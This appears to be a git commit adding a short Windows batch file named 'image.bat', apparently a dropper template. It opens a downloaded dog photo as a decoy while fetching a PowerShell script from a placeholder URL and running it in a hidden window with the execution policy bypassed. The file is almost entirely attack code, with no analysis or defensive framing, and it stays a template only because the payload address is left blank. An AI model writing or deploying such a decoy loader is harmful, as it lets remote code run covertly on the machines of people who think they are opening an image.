0c9e75de8c904807084bf586749303fed0437944
0xdom <54208845+Real0xdom@users.noreply.github.com>
2022-07-11 08:06:49 -0600

    Add files via upload

---
+++ image.bat
@@ -0,0 +1,9 @@
+
+REM useing Temp as our location
+pushd %temp%
+powershell Invoke-WebRequest "https://static.onecms.io/wp-content/uploads/sites/24/2021/04/26/GettyImages-185743593-2000.jpg" -Outfile "doggy.jpg"
+doggy.jpg
+
+powershell Invoke-WebRequest -Uri site hosting your powershell script -OutFile .\power.ps1;
+
+start PowerShell -windowstyle hidden -NoProfile -ExecutionPolicy Bypass -file "power.ps1"
